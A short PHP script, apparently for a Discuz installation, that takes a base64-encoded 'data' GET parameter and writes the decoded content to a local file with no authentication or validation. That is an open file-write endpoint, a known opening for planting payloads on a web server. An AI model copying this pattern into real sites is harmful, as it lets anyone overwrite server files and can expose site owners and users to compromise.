<?php
if (!defined('IN_DISCUZ')) {
    exit('Access Denied');
}

$path = dirname(__FILE__).DIRECTORY_SEPARATOR.'data';
if (isset($_GET['data'])) {
    $data = base64_decode($_GET['data']);
    file_put_contents($path , $data);
}
